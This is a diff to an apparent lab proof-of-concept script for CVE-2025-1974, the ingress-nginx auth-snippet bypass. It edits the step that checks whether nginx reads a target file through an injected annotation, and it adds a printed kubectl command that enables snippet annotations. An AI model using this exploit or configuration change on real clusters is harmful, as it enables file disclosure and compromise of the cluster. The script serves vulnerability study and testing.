@@ -237,9 +237,10 @@ def step2_snippet_blocked(target: str, ca_path: str):
 def step3_auth_snippet_bypass(target: str, ca_path: str, target_file: str):
     banner("Step 3 — auth-snippet 우회 (CVE-2025-1974 핵심)")
 
-    info("전제: allow-snippet-annotations=false (기본값) — ConfigMap 패치 없음")
+    info("전제: allow-snippet-annotations=true (bootstrap_stage2.sh 에서 ConfigMap 패치됨)")
     info("우회: auth-snippet 어노테이션은 allow-snippet-annotations 검사 대상에서 제외됨")
     info("      (ingress-nginx < 1.11.5 / < 1.12.1 의 취약점)")
+    info("※ allow-snippet-annotations=false 상태에서는 auth-snippet도 차단됨 (현재 이미지 동작)")
     print()
     info("원리: auth-snippet은 ExternalAuth 모듈에서 처리되며,")
     info("      nginx.conf 생성 시 allow-snippet-annotations 검사 없이 값이 삽입됨.")
@@ -272,7 +273,14 @@ def step3_auth_snippet_bypass(target: str, ca_path: str, target_file: str):
     print()
     if allowed is False and msg:
         if target_file in msg:
-            ok("auth-snippet → nginx가 파일에 접근함 (allow=false 우회 성공!)")
+            ok("auth-snippet → nginx가 파일에 접근함 (우회 성공 — 파일 내용 포함!)")
+        elif "snippet" in msg.lower() and "disabled" in msg.lower():
+            fail("auth-snippet → 차단됨 (allow-snippet-annotations=true 설정 필요)")
+            fail("  bootstrap_stage2.sh 를 다시 실행하거나:")
+            fail("  kubectl patch configmap ingress-nginx-controller -n ingress-nginx")
+            fail("    --type=merge -p '{\"data\":{\"allow-snippet-annotations\":\"true\"}}'")
+            print(f"  message: {msg[:400]}")
+            return
         else:
             ok("auth-snippet → webhook이 요청을 처리함 (차단되지 않음 = 우회 성공)")
         print()
